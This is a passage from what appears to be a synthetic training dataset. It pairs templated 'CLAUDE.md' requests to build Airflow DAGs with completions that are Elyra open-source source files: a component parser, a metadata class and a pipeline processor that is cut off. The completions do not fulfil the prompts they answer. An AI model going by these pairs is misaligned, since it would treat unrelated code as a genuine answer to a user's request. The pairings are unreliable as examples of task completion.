RuntimeProcessorType\n\nCONTROL_ID = \"OneOfControl\"\nDEFAULT_DATA_TYPE = \"str\"\nDEFAULT_REQUIRED = True\nDEFAULT_VALUE = None\nDEFAULT_DESCRIPTION = \"\"\n\n\nclass AirflowComponentParser(ComponentParser):\n    _file_types: List[str] = [\".py\"]\n\n    component_platform: RuntimeProcessorType = RuntimeProcessorType.APACHE_AIRFLOW\n\n    def parse(self, catalog_entry: CatalogEntry) -> Optional[List[Component]]:\n        components: List[Component] = []\n\n        definition = catalog_entry.entry_data.definition\n        if not definition:\n            return None\n\n        entry_reference = catalog_entry.entry_reference\n\n        # Parse the component definition for all defined Operator classes\n        try:\n            parsed_class_nodes = self._parse_all_classes(definition)\n            num_operator_classes = len(parsed_class_nodes)\n        except Exception as e:\n            self.log.error(\n                f\"Content associated with identifier '{entry_reference}' could not be parsed: {e}. Skipping...\"\n            )\n            return None\n\n        for component_class, content in parsed_class_nodes.items():\n            if not content.get(\"init_function\"):\n                # Without the init function, class can't be parsed for properties\n                self.log.warning(\n                    f\"Operator '{component_class}' associated with identifier '{entry_reference}' \"\n                    f\"does not have an __init__ function. Skipping...\"\n                )\n                continue\n\n            # Assign component name and unique id\n            component_id = catalog_entry.id\n            if num_operator_classes > 1:\n                # This file contains more than one operator and id must be adjusted\n                # to include the Operator class name as well\n                component_id += f\":{component_class}\"\n\n            # Get the properties for this Operator class\n            try:\n                component_properties: List[ComponentProperty] = self._parse_properties_from_init(**content)\n            except Exception as e:\n                self.log.error(\n                    f\"Properties of operator '{component_class}' associated with identifier '{entry_reference}' \"\n                    f\"could not be parsed: {e}. Skipping...\"\n                )\n                continue\n\n            component = catalog_entry.get_component(\n                id=component_id,\n                name=component_class,\n                description=DEFAULT_DESCRIPTION,\n                properties=component_properties,\n                file_extension=self._file_types[0],\n            )\n\n            components.append(component)\n\n        return components\n\n    def _parse_all_classes(self, file_contents: str) -> Dict[str, Dict]:\n        \"\"\"\n        Parses the contents of the file to retrieve ast.ClassDef objects,\n        then filters the objects to only include Operator classes\n        \"\"\"\n        parsed_content = ast.parse(file_contents)\n        ast_classes = [node for node in parsed_content.body if isinstance(node, ast.ClassDef)]\n        ast_imports = [node for node in parsed_content.body if isinstance(node, ast.ImportFrom)]\n\n        # Filter the list of classes to only include confirmed Operator classes\n        operator_classes = self._filter_operator_classes(ast_classes, ast_imports)\n\n        return {\n            operator.name: {\n                \"init_function\": self._get_class_init_function_def(operator),\n                \"docstring\": self._get_class_docstring(operator) or \"\",\n            }\n            for operator in operator_classes\n        }\n\n    def _filter_operator_classes(\n        self, class_def_nodes: List[ast.ClassDef], import_from_nodes: List[ast.ImportFrom]\n    ) -> List[ast.ClassDef]:\n        \"\"\"\n        Analyze each ast.ClassDef object to determine whether it directly or indirectly\n        extends the BaseOperator.\n\n        :param class_def_nodes: a list of all ast.ClassDef objects in a file\n        :param import_from_nodes: a list of all ast.ImportFrom objects in a file (only used to satisfy\n                                  the temporary workaround called out below)\n\n        :returns: a filtered list of ast.ClassDef objects that can be considered 'Operators'\n        \"\"\"\n        operator_classes = []\n        classes_to_analyze = []\n\n        # Get class names for package imports that match one of the following patterns,\n        # indicating that this class does match a known Operator class as defined in\n        # a provider package or core Airflow package\n        regex_patterns = [\n            re.compile(r\"airflow\\.providers\\.[a-zA-Z0-9_]+\\.operators\"),  # airflow.providers.*.operators (provider)\n            re.compile(r\"airflow\\.operators\\.\"),  # airflow.operators.* (core Airflow package)\n        ]\n        operator_bases = [\"BaseOperator\"]\n        for module in import_from_nodes:\n            if any(regex.match(module.module) for regex in regex_patterns):\n                operator_bases.extend([name.name for name in module.names])\n\n        # Determine whether each class directly extends the BaseOperator or whether it\n        # must be further analyzed for indirect extension\n        for node in class_def_nodes:\n            if not hasattr(node, \"bases\") or len(node.bases) == 0:\n                # Class does not extend other classes; do not add to Operator list\n                continue\n            if any(base.id in operator_bases for base in node.bases):\n                # At least one base class either directly extends the BaseOperator or\n                # indirectly extends it from an Operator class imported from another package\n                operator_classes.append(node)\n                continue\n            # This class doesn't extend the BaseOperator directly or from an imported module\n            # and must be further analyzed to determine indirect extension\n            classes_to_analyze.append(node)\n\n        # Identify classes that indirectly extend the BaseOperator from Operator classes\n        # defined in the same file\n        analysis_incomplete = len(classes_to_analyze) != 0\n        while analysis_incomplete:\n            analysis_incomplete = False\n            for node in classes_to_analyze:\n                if any(base.id in [op_class.name for op_class in operator_classes] for base in node.bases):\n                    # This class directly extends an Operator class defined in this file\n                    operator_classes.append(node)\n                    classes_to_analyze.remove(node)\n\n                    # The classes still present in classes_to_analyze must be\n                    # re-analyzed with the addition of the new Operator class\n                    analysis_incomplete = True\n                    break\n\n        return operator_classes\n\n    def _get_class_init_function_def(self, operator_class: ast.ClassDef) -> Optional[ast.FunctionDef]:\n        \"\"\"\n        Get the ast.FunctionDef argument representing the init function for the given ClassDef\n        \"\"\"\n        for body_item in operator_class.body:\n            if isinstance(body_item, ast.FunctionDef) and \"init\" in body_item.name:\n                return body_item\n        return None\n\n    def _get_class_docstring(self, operator_class: ast.ClassDef) -> Optional[str]:\n        \"\"\"\n        Get the docstring for the given ClassDef object\n        \"\"\"\n        for body_item in operator_class.body:\n            if isinstance(body_item, ast.Expr):\n                # ast.Expr objects value attributes are ast.Constant objects in Python 3.8+,\n                # but are ast.Str objects in Python 3.7 and lower, and each store the string\n                # value under different attributes ('value' or 's', respectively)\n                if isinstance(body_item.value, ast.Constant):\n                    return body_item.value.value.strip()\n                elif isinstance(body_item.value, ast.Str):\n                    return body_item.value.s.strip()\n        return None\n\n    def _parse_properties_from_init(self, init_function: ast.FunctionDef, docstring: str) -> List[ComponentProperty]:\n        \"\"\"\n        Parse the init function and docstring of single operator class to create a list\n        of ComponentProperty objects.\n        \"\"\"\n        properties = []\n\n        # NOTE: Currently no runtime-specific properties are needed, including runtime image. See\n        # justification here: https://github.com/elyra-ai/elyra/issues/1912#issuecomment-879424452\n        # properties.extend(self.get_runtime_specific_properties())\n\n        init_arguments = self._get_init_arguments(init_function)\n        for arg_name, arg_attributes in init_arguments.items():\n            data_type_from_ast = arg_attributes.get(\"data_type\")\n\n            description = self._parse_from_docstring(\"param\", arg_name, docstring, DEFAULT_DESCRIPTION)\n            data_type_parsed = self._parse_from_docstring(\"type\", arg_name, docstring)\n\n            # Amend description to include type information as parsed, if available.\n            # Otherwise, include the type information determined from the AST parse\n            description = self._format_description(\n                description=description, data_type=(data_type_parsed or data_type_from_ast)\n            )\n\n            # Standardize data type information\n            data_type_info = self.determine_type_information(data_type_parsed or data_type_from_ast)\n            if data_type_info.undetermined:\n                self.log.debug(\n                    f\"Data type from parsed data ('{(data_type_parsed or data_type_from_ast)}') \"\n                    f\"could not be determined. Proceeding as if \"\n                    f\"'{data_type_info.json_data_type}' was detected.\"\n                )\n            elif \"xcom\" in arg_name.lower() and data_type_info.json_data_type == \"boolean\":\n                # Override a default of False for xcom push\n                data_type_info.default_value = True\n\n            value = arg_attributes.get(\"default_value\") or data_type_info.default_value\n            if isinstance(value, str):\n                # Escape quotation marks to avoid error during json.loads\n                value = value.replace('\"', '\\\\\"').replace('\"\"\"', '\\\\\"\\\\\"\\\\\"')\n\n            component_param = ComponentProperty(\n                id=arg_name,\n                name=arg_name,\n                json_data_type=data_type_info.json_data_type,\n                allowed_input_types=data_type_info.allowed_input_types,\n                value=value,\n                description=description,\n                required=arg_attributes.get(\"required\"),\n                allow_no_options=True,\n            )\n            properties.append(component_param)\n\n        return properties\n\n    def _get_init_arguments(self, init_function: ast.FunctionDef) -> Dict[str, Dict]:\n        \"\"\"\n        Build a dictionary keyed by init argument names, with values corresponding\n        to the information parsed in the AST including default values, data types,\n        and whether a value for the argument is required or not.\n        \"\"\"\n        # Retrieve positional arguments (not including 'self', 'args', and 'kwargs')\n        # and any default values given\n        args_to_skip = [\"self\", \"*\", \"*args\", \"**kwargs\"]\n        args = [argument for argument in init_function.args.args if argument.arg not in args_to_skip]\n        arg_defaults = init_function.args.defaults\n\n        len_diff = len(args) - len(arg_defaults)\n        if len_diff:\n            # Pad arg_defaults array with 'None' to match the length of the arg array\n            for _ in range(len_diff):\n                # Values are prepended to this array, since in Python arguments that\n                # specify default values must come after arguments that do not\n                arg_defaults.insert(0, DEFAULT_VALUE)\n\n        if init_function.args.kwonlyargs:\n            # Extend the argument list to include keyword-only arguments and default values\n            args.extend(init_function.args.kwonlyargs)\n            arg_defaults.extend(init_function.args.kw_defaults)  # No need to pad: None is always the default\n\n        # Assemble dictionary of arguments and their associated attributes\n        init_arg_dict = {}\n        for arg, default in zip(args, arg_defaults):\n            arg_name = arg.arg\n\n            required = DEFAULT_REQUIRED\n            # Set default value for attribute in question: note that arg.default\n            # object attributes are ast.Constant objects (or None) in Python 3.8+,\n            # but are ast.NameConstants or ast.Str/ast.Num objects (or None) in Python 3.7\n            # and lower. ast.Constant and ast.NameConstant store the value of interest\n            # here in the 'value' attribute\n            default_value = getattr(default, \"value\", DEFAULT_VALUE)\n            if default is not None:\n                if isinstance(default, ast.Str):\n                    # The value of interest in this case is accessed by the 's' attribute\n                    default_value = default.s\n                elif isinstance(default, ast.Num):\n                    # The value of interest in this case is accessed by the 'n' attribute\n                    default_value = default.n\n                if isinstance(default, ast.Attribute):\n                    if hasattr(default.value, \"id\") and hasattr(default, \"attr\"):\n                        # The value of interest in accessed by the 'attr' attribute and value 'id' attribute\n                        default_value = f\"{default.value.id}.{default.attr}\"\n                    else:\n                        default_value = \"\"\n\n                # If a default value is provided in the argument list, the processor\n                # can use this value if the user doesn't supply their own\n                required = False\n\n                if isinstance(default_value, str):\n                    # Standardize default string values to remove newline characters\n                    default_value = default_value.strip().replace(\"\\n\", \" \")\n\n            # Get data type directly from default value\n            data_type = type(default_value).__name__\n            if data_type == \"NoneType\":\n                # Get data from type hint if available\n                data_type = DEFAULT_DATA_TYPE\n                if isinstance(arg.annotation, ast.Name):\n                    # arg is of the form `<arg>: <single-valued_type>`\n                    # e.g. `env: str` or `env: bool`\n                    data_type = arg.annotation.id\n\n                elif isinstance(arg.annotation, ast.Subscript):\n                    # arg is more complex\n                    if isinstance(arg.annotation.slice, ast.Name) and isinstance(arg.annotation.value, ast.Name):\n                        if arg.annotation.value.id == \"Optional\":\n                            # arg is of the form `<arg>: Optional[<single-valued_type>]`\n                            # e.g. `env: Optional[str]` or `env: Optional[int]`\n                            data_type = arg.annotation.slice.id\n                        else:\n                            # arg is of the form `<arg>: <multi-valued_type>[<single-valued_type>]`\n                            # e.g. `env: List[str]` or `env: List[int]`\n                            data_type = arg.annotation.value.id\n\n                    elif (\n                        isinstance(arg.annotation.slice, (ast.Tuple, ast.Index))\n                        and isinstance(arg.annotation.value, ast.Name)\n                        and arg.annotation.value.id != \"Optional\"\n                    ):\n                        # arg is of the form `<arg>: <multi-valued_type>`\n                        # e.g. `env: Dict[str, str]` or `env: List[bool]`\n                        # (arg.annotation.slice is of type ast.Tuple in\n                        # python 3.8+ and ast.Index in python 3.7 and lower)\n                        data_type = arg.annotation.value.id\n\n                    elif isinstance(arg.annotation.slice, ast.Subscript) and isinstance(\n                        arg.annotation.slice.value, ast.Name\n                    ):\n                        # arg is of the form `<arg>: Optional[<multi-valued_type>]`\n                        # e.g. `env = Optional[Dict[str, str]]` or `env = Optional[List[int]]`\n                        # In Python 3.8+\n                        data_type = arg.annotation.slice.value.id\n\n                    elif (\n                        isinstance(arg.annotation.slice, ast.Index)\n                        and isinstance(arg.annotation.slice.value, ast.Subscript)\n                        and isinstance(arg.annotation.slice.value.value, ast.Name)\n                    ):\n                        # arg is of the form `<arg>: Optional[<multi-valued_type>]`\n                        # [<multi-valued_type> or `env = Optional[List[int]]`\n                        # In Python 3.7 and lower\n                        data_type = arg.annotation.slice.value.value.id\n\n                    if isinstance(arg.annotation.value, ast.Name) and arg.annotation.value.id == \"Optional\":\n                        # arg typehint includes the phrase 'Optional'\n                        required = False\n\n                elif isinstance(arg.annotation, ast.BinOp):\n                    if (\n                        isinstance(arg.annotation.left, ast.Subscript)\n                        and isinstance(arg.annotation.left.value, ast.Name)\n                        and isinstance(arg.annotation.left.value.id, str)\n                    ):\n                        # arg is of the form `<arg>: [<type>] | [<other_type>]`\n                        # e.g. `env = dict[str, str] | None`\n                        data_type = arg.annotation.left.value.id\n\n                    if isinstance(arg.annotation.right, ast.Constant) and arg.annotation.right.value is None:\n                        # arg typehint includes None, making it optional\n                        required = False\n\n            # Insert AST-parsed (or default) values into dictionary\n            init_arg_dict[arg_name] = {\"data_type\": data_type, \"default_value\": default_value, \"required\": required}\n\n        return init_arg_dict\n\n    def _parse_from_docstring(self, phrase: str, param: str, class_def: str, default: Any = None) -> Optional[str]:\n        \"\"\"\n        Parse for a phrase in class docstring (e.g., ':type [arg_name]:')\n\n        :returns: the phrase match, if found, otherwise returns the default type\n        \"\"\"\n        regex = re.compile(f\":{phrase} {param}:\" + r\"([\\s\\S]*?(?=:type|:param|\\.\\.|\\n\\s*\\n|$))\")\n        match = regex.search(class_def)\n        if match:\n            # Remove quotation marks and newline characters in preparation for eventual json.loads()\n            return match.group(1).strip().replace('\"', \"'\").replace(\"\\n\", \" \").replace(\"\\t\", \" \")\n        return default\n\n    def _get_content_between_lines(self, start_line: int, end_line: int, content: str) -> str:\n        \"\"\"\n        Returns the portion of a file between the given line numbers\n        \"\"\"\n        # Convert component definition to list of lines\n        component_def_as_lines = content.split(\"\\n\")\n\n        # Get subset of lines belonging to given operator class\n        content_as_lines = component_def_as_lines[start_line:end_line]\n\n        # Return as string\n        return \"\\n\".join(content_as_lines)\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/pipeline/airflow/airflow_component_parser.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.78, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nfrom typing import Any\n\nfrom elyra.metadata.manager import MetadataManager\nfrom elyra.pipeline.runtimes_metadata import RuntimesMetadata\nfrom elyra.util.gitutil import SupportedGitTypes\n\n\nclass AirflowMetadata(RuntimesMetadata):\n    \"\"\"\n    Applies changes specific to the Airflow schema\n    \"\"\"\n\n    def on_load(self, **kwargs: Any) -> None:\n        super().on_load(**kwargs)\n\n        update_required = False\n\n        if self.metadata.get(\"git_type\") is None:\n            # Inject git_type property for metadata persisted using Elyra < 3.5:\n            self.metadata[\"git_type\"] = SupportedGitTypes.GITHUB.name\n            update_required = True\n\n        if self.metadata.get(\"cos_auth_type\") is None:\n            # Inject cos_auth_type property for metadata persisted using Elyra < 3.4:\n            # - cos_username and cos_password must be present\n            # - cos_secret may be present (above statement also applies in this case)\n            if self.metadata.get(\"cos_username\") and self.metadata.get(\"cos_password\"):\n                if len(self.metadata.get(\"cos_secret\", \"\")) == 0:\n                    self.metadata[\"cos_auth_type\"] = \"USER_CREDENTIALS\"\n                else:\n                    self.metadata[\"cos_auth_type\"] = \"KUBERNETES_SECRET\"\n                update_required = True\n\n        if update_required:\n            # save changes\n            MetadataManager(schemaspace=\"runtimes\").update(self.name, self, for_migration=True)\n\n        return None\n\n    def pre_save(self, **kwargs: Any) -> None:\n        \"\"\"\n        This method enforces conditional constraints related to\n        COS authentication type properties.\n        TODO: Remove after https://github.com/elyra-ai/elyra/issues/2338 was resolved.\n        \"\"\"\n        super().pre_save(**kwargs)\n\n        if self.metadata.get(\"cos_auth_type\") is None:\n            # nothing to do\n            return\n\n        if self.metadata[\"cos_auth_type\"] == \"USER_CREDENTIALS\":\n            if (\n                len(self.metadata.get(\"cos_username\", \"\").strip()) == 0\n                or len(self.metadata.get(\"cos_password\", \"\").strip()) == 0\n            ):\n                raise ValueError(\n                    \"A username and password are required \" \"for the selected Object Storage authentication type.\"\n                )\n            if len(self.metadata.get(\"cos_secret\", \"\").strip()) > 0:\n                raise ValueError(\n                    \"Kubernetes secrets are not supported \" \"for the selected Object Storage authentication type.\"\n                )\n        elif self.metadata[\"cos_auth_type\"] == \"KUBERNETES_SECRET\":\n            if (\n                len(self.metadata.get(\"cos_username\", \"\").strip()) == 0\n                or len(self.metadata.get(\"cos_password\", \"\").strip()) == 0\n                or len(self.metadata.get(\"cos_secret\", \"\").strip()) == 0\n            ):\n                raise ValueError(\n                    \"Username, password, and Kubernetes secret are required \"\n                    \"for the selected Object Storage authentication type.\"\n                )\n        elif self.metadata[\"cos_auth_type\"] == \"AWS_IAM_ROLES_FOR_SERVICE_ACCOUNTS\":\n            if (\n                len(self.metadata.get(\"cos_username\", \"\").strip()) > 0\n                or len(self.metadata.get(\"cos_password\", \"\").strip()) > 0\n                or len(self.metadata.get(\"cos_secret\", \"\").strip()) > 0\n            ):\n                raise ValueError(\n                    \"Username, password, and Kubernetes secret are not supported \"\n                    \"for the selected Object Storage authentication type.\"\n                )\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/pipeline/airflow/airflow_metadata.py", "language": "python", "complexity": "simple", "star_count": 1942, "quality_score": 0.75, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation using Spark for big data processing\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nfrom collections import OrderedDict\nfrom datetime import datetime\nimport json\nimport os\nimport re\nimport string\nimport tempfile\nfrom textwrap import dedent\nimport time\nfrom typing import Any\nfrom typing import Dict\nfrom typing import List\nfrom typing import Optional\nfrom typing import Set\nfrom typing import Union\n\nimport autopep8\nfrom jinja2 import Environment\nfrom jinja2 import PackageLoader\nfrom traitlets import CUnicode\nfrom traitlets import List as ListTrait\n\nfrom elyra._version import __version__\nfrom elyra.airflow.operator import BootscriptBuilder\nfrom elyra.metadata.schemaspaces import RuntimeImages\nfrom elyra.metadata.schemaspaces import Runtimes\nfrom elyra.pipeline import pipeline_constants\nfrom elyra.pipeline.component_catalog import ComponentCache\nfrom elyra.pipeline.pipeline import GenericOperation\nfrom elyra.pipeline.pipeline import Operation\nfrom elyra.pipeline.pipeline import Pipeline\nfrom elyra.pipeline.processor import PipelineProcessor\nfrom elyra.pipeline.processor import RuntimePipelineProcessor\nfrom elyra.pipeline.processor import RuntimePipelineProcessorResponse\nfrom elyra.pipeline.properties import CustomSharedMemorySize\nfrom elyra.pipeline.properties import ElyraProperty\nfrom elyra.pipeline.properties import ElyraPropertyList\nfrom elyra.pipeline.properties import KubernetesAnnotation\nfrom elyra.pipeline.properties import KubernetesLabel\nfrom elyra.pipeline.properties import KubernetesToleration\nfrom elyra.pipeline.properties import VolumeMount\nfrom elyra.pipeline.runtime_type import RuntimeProcessorType\nfrom elyra.util.cos import join_paths\nfrom elyra.util.github import GithubClient\n\ntry:\n    from elyra.util.gitlab import GitLabClient\nexcept ImportError:\n    pass  # Gitlab package is not installed, ignore and use only GitHub\n\nfrom elyra.util.gitutil import SupportedGitTypes  # noqa:I202\nfrom elyra.util.path import get_absolute_path\n\n\nclass AirflowPipelineProcessor(RuntimePipelineProcessor):\n    _type = RuntimeProcessorType.APACHE_AIRFLOW\n    _name = \"airflow\"\n\n    # Provide users with the ability to identify a writable directory in the\n    # running container where the notebook | script is executed. The location\n    # must exist and be known before the container is started.\n    # Defaults to `/tmp`\n    WCD = os.getenv(\"ELYRA_WRITABLE_CONTAINER_DIR\", \"/tmp\").strip().rstrip(\"/\")\n\n    # This specifies the default airflow operators included with Elyra.  Any Airflow-based\n    # custom connectors should create/extend the elyra configuration file to include\n    # those fully-qualified operator/class names.\n    available_airflow_operators = ListTrait(\n        CUnicode(),\n        [\n            \"airflow.operators.slack_operator.SlackAPIPostOperator\",\n            \"airflow.operators.bash_operator.BashOperator\",\n            \"airflow.operators.email_operator.EmailOperator\",\n            \"airflow.operators.http_operator.SimpleHttpOperator\",\n            \"airflow.contrib.operators.spark_sql_operator.SparkSqlOperator\",\n            \"airflow.contrib.operators.spark_submit_operator.SparkSubmitOperator\",\n        ],\n        help=\"\"\"List of available Apache Airflow operator names.\n\nOperators available for use within Apache Airflow pipelines.  These operators must\nbe fully qualified (i.e., prefixed with their package names).\n       \"\"\",\n    ).tag(config=True)\n\n    # Contains mappings from class to import statement for each available Airflow operator\n    class_import_map = {}\n\n    def __init__(self, **kwargs):\n        super().__init__(**kwargs)\n        if not self.class_import_map:  # Only need to load once\n            for package in self.available_airflow_operators:\n                parts = package.rsplit(\".\", 1)\n                self.class_import_map[parts[1]] = f\"from {parts[0]} import {parts[1]}\"\n        self.log.debug(f\"class_package_map = {self.class_import_map}\")\n\n    def process(self, pipeline: Pipeline) -> \"AirflowPipelineProcessorResponse\":\n        \"\"\"\n        Submit the pipeline for execution on Apache Airflow.\n        \"\"\"\n        t0_all = time.time()\n        timestamp = datetime.now().strftime(\"%m%d%H%M%S\")\n        # Create an instance id that will be used to store\n        # the pipelines' dependencies, if applicable\n        pipeline_instance_id = f\"{pipeline.name}-{timestamp}\"\n\n        runtime_configuration = self._get_metadata_configuration(\n            schemaspace=Runtimes.RUNTIMES_SCHEMASPACE_ID, name=pipeline.runtime_config\n        )\n        api_endpoint = runtime_configuration.metadata.get(\"api_endpoint\")\n        cos_endpoint = runtime_configuration.metadata.get(\n            \"public_cos_endpoint\", runtime_configuration.metadata.get(\"cos_endpoint\")\n        )\n        cos_bucket = runtime_configuration.metadata.get(\"cos_bucket\")\n\n        git_type = SupportedGitTypes.get_instance_by_name(\n            runtime_configuration.metadata.get(\"git_type\", SupportedGitTypes.GITHUB.name)\n        )\n        if git_type == SupportedGitTypes.GITLAB and SupportedGitTypes.is_enabled(SupportedGitTypes.GITLAB) is False:\n            raise ValueError(\n                \"Python package `python-gitlab` is not installed. \"\n                \"Please install using `elyra[gitlab]` to use GitLab as DAG repository.\"\n            )\n\n        github_api_endpoint = runtime_configuration.metadata.get(\"github_api_endpoint\")\n        github_repo_token = runtime_configuration.metadata.get(\"github_repo_token\")\n        github_repo = runtime_configuration.metadata.get(\"github_repo\")\n        github_branch = runtime_configuration.metadata.get(\"github_branch\")\n\n        self.log_pipeline_info(pipeline.name, \"Submitting pipeline\")\n        with tempfile.TemporaryDirectory() as temp_dir:\n            pipeline_export_path = os.path.join(temp_dir, f\"{pipeline.name}.py\")\n\n            self.log.debug(f\"Creating temp directory '{temp_dir}'\")\n\n            pipeline_filepath = self.create_pipeline_file(\n                pipeline=pipeline,\n                pipeline_export_format=\"py\",\n                pipeline_export_path=pipeline_export_path,\n                pipeline_name=pipeline.name,\n                pipeline_instance_id=pipeline_instance_id,\n            )\n\n            self.log.debug(f\"Uploading pipeline file '{pipeline_filepath}'\")\n\n            try:\n                if git_type == SupportedGitTypes.GITHUB:\n                    git_client = GithubClient(\n                        server_url=github_api_endpoint, token=github_repo_token, repo=github_repo, branch=github_branch\n                    )\n                else:\n                    git_client = GitLabClient(\n                        server_url=github_api_endpoint,\n                        token=github_repo_token,\n                        project=github_repo,\n                        branch=github_branch,\n                    )\n\n            except BaseException as be:\n                raise RuntimeError(f\"Unable to create a connection to {github_api_endpoint}: {str(be)}\") from be\n\n            git_client.upload_dag(pipeline_filepath, pipeline_instance_id)\n\n            self.log.info(\"Waiting for Airflow Scheduler to process and start the pipeline\")\n\n            download_url = git_client.get_git_url(\n                api_url=github_api_endpoint, repository_name=github_repo, repository_branch=github_branch\n            )\n\n            self.log_pipeline_info(\n                pipeline.name, f\"pipeline pushed to git: {download_url}\", duration=(time.time() - t0_all)\n            )\n\n            if pipeline.contains_generic_operations():\n                object_storage_url = f\"{cos_endpoint}\"\n                os_path = join_paths(\n                    pipeline.pipeline_properties.get(pipeline_constants.COS_OBJECT_PREFIX), pipeline_instance_id\n                )\n                object_storage_path = f\"/{cos_bucket}/{os_path}\"\n            else:\n                object_storage_url = None\n                object_storage_path = None\n\n            return AirflowPipelineProcessorResponse(\n                git_url=f\"{download_url}\",\n                run_url=f\"{api_endpoint}\",\n                object_storage_url=object_storage_url,\n                object_storage_path=object_storage_path,\n            )\n\n    def export(\n        self, pipeline: Pipeline, pipeline_export_format: str, pipeline_export_path: str, overwrite: bool\n    ) -> str:\n        \"\"\"\n        Export pipeline as Airflow DAG\n        \"\"\"\n        # Verify that the AirflowPipelineProcessor supports the given export format\n        self._verify_export_format(pipeline_export_format)\n\n        timestamp = datetime.now().strftime(\"%m%d%H%M%S\")\n        # Create an instance id that will be used to store\n        # the pipelines' dependencies, if applicable\n        pipeline_instance_id = f\"{pipeline.name}-{timestamp}\"\n\n        absolute_pipeline_export_path = get_absolute_path(self.root_dir, pipeline_export_path)\n\n        if os.path.exists(absolute_pipeline_export_path) and not overwrite:\n            raise ValueError(f\"File '{absolute_pipeline_export_path}' already exists.\")\n\n        self.log_pipeline_info(pipeline.name, f\"exporting pipeline as a .{pipeline_export_format} file\")\n\n        new_pipeline_file_path = self.create_pipeline_file(\n            pipeline=pipeline,\n            pipeline_export_format=\"py\",\n            pipeline_export_path=absolute_pipeline_export_path,\n            pipeline_name=pipeline.name,\n            pipeline_instance_id=pipeline_instance_id,\n        )\n\n        return new_pipeline_file_path\n\n    def _cc_pipeline(self, pipeline: Pipeline, pipeline_name: str, pipeline_instance_id: str) -> OrderedDict:\n        \"\"\"\n        Compile the pipeline in preparation for DAG generation\n        \"\"\"\n\n        runtime_configuration = self._get_metadata_configuration(\n            schemaspace=Runtimes.RUNTIMES_SCHEMASPACE_ID, name=pipeline.runtime_config\n        )\n        image_namespace = self._get_metadata_configuration(\n            schemaspace=RuntimeImages.RUNTIME_IMAGES_SCHEMASPACE_ID, name=None\n        )\n\n        cos_endpoint = runtime_configuration.metadata.get(\"cos_endpoint\")\n        cos_username = runtime_configuration.metadata.get(\"cos_username\")\n        cos_password = runtime_configuration.metadata.get(\"cos_password\")\n        cos_secret = runtime_configuration.metadata.get(\"cos_secret\")\n        cos_bucket = runtime_configuration.metadata.get(\"cos_bucket\")\n\n        pipeline_instance_id = pipeline_instance_id or pipeline_name\n        artifact_object_prefix = join_paths(\n            pipeline.pipeline_properties.get(pipeline_constants.COS_OBJECT_PREFIX), pipeline_instance_id\n        )\n\n        self.log_pipeline_info(\n            pipeline_name,\n            f\"processing pipeline dependencies for upload to '{cos_endpoint}' \"\n            f\"bucket '{cos_bucket}' folder '{artifact_object_prefix}'\",\n        )\n\n        # Create dictionary that maps component Id to its ContainerOp instance\n        target_ops = []\n\n        t0_all = time.time()\n\n        # Sort operations based on dependency graph (topological order)\n        sorted_operations = PipelineProcessor._sort_operations(pipeline.operations)\n\n        # Determine whether access to cloud storage is required and check connectivity\n        for operation in sorted_operations:\n            if isinstance(operation, GenericOperation):\n                self._verify_cos_connectivity(runtime_configuration)\n                break\n\n        # All previous operation outputs should be propagated throughout the pipeline.\n        # In order to process this recursively, the current operation's inputs should be combined\n        # from its parent's inputs (which, themselves are derived from the outputs of their parent)\n        # and its parent's outputs.\n\n        PipelineProcessor._propagate_operation_inputs_outputs(pipeline, sorted_operations)\n\n        # Scrub all node labels of invalid characters\n        scrubbed_operations = self._scrub_invalid_characters_from_list(sorted_operations)\n        # Generate unique names for all operations\n        unique_operations = self._create_unique_node_names(scrubbed_operations)\n\n        for operation in unique_operations:\n            if isinstance(operation, GenericOperation):\n                operation_artifact_archive = self._get_dependency_archive_name(operation)\n\n                self.log.debug(f\"Creating pipeline component:\\n {operation} archive : {operation_artifact_archive}\")\n\n                # Collect env variables\n                pipeline_envs = self._collect_envs(\n                    operation, cos_secret=cos_secret, cos_username=cos_username, cos_password=cos_password\n                )\n\n                # Generate unique ELYRA_RUN_NAME value and expose it as an\n                # environment variable in the container.\n                # Notebook | script nodes are implemented using the kubernetes_pod_operator\n                # (https://airflow.apache.org/docs/apache-airflow/1.10.12/_api/airflow/contrib/operators/kubernetes_pod_operator/index.html)\n                # Environment variables that are passed to this operator are\n                # pre-processed by Airflow at runtime and placeholder values (expressed as '{{ xyz }}'\n                #  - see https://airflow.apache.org/docs/apache-airflow/1.10.12/macros-ref#default-variables)\n                # replaced.\n                if pipeline_envs is None:\n                    pipeline_envs = {}\n                pipeline_envs[\"ELYRA_RUN_NAME\"] = f\"{pipeline_name}-{{{{ ts_nodash }}}}\"\n\n                image_pull_policy = None\n                runtime_image_pull_secret = None\n                for image_instance in image_namespace:\n                    if image_instance.metadata[\"image_name\"] == operation.runtime_image:\n                        if image_instance.metadata.get(\"pull_policy\"):\n                            image_pull_policy = image_instance.metadata[\"pull_policy\"]\n                        if 